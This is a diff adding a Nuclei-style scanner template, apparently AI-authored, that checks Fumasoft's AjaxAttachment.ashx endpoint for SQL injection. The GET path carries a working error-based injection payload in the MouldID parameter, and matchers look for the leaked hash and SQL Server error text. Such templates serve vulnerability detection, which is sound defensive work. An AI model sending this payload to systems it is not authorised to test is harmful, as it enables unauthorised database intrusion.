@@ -1,0 +1,28 @@
+id: fumasoft-ajaxattachment-sqli
+info:
+  name: Fumasoft AjaxAttachment SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(1000, 100000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/m/Dingding/Ajax/AjaxAttachment.ashx?method=saveAttach&MouldID=1%27and+1<sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))--'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - contains(body, "0x" + t2)
+          - contains(body, "FumaCRM")
+          - contains(body, ".AjaxAttachment")
+          - regex(body, "转换成数据类型(.*?)时失败")
+          - regex(body, "在将(.*?)值")
